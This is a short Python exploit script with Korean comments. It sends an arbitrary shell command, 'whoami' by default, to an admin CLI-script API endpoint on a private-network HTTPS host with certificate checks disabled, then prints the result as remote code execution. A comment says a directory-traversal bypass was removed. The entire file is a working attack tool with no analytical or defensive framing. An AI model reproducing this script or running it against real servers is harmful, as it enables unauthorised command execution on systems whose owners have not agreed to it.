import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://192.168.1.25:8443"
EXPLOIT_PATH = "/api/v1/admin/cli-script"  # 디렉터리 우회 제거!

def exploit_rce(cmd="whoami"):
    url = TARGET + EXPLOIT_PATH
    headers = {'Content-Type': 'application/json'}
    payload = {
        "command": cmd
    }

    print(f"[+] 명령 전송 중: {cmd}")
    try:
        response = requests.post(url, json=payload, headers=headers, verify=False)

        if response.status_code == 200:
            print("[+] 명령 실행 성공! 응답 내용:")
            print(response.text)
        else:
            print(f"[-] 실패. 상태 코드: {response.status_code}")
            print(response.text)
    except Exception as e:
        print(f"[!] 요청 오류 발생: {e}")

if __name__ == "__main__":
    exploit_rce("whoami")
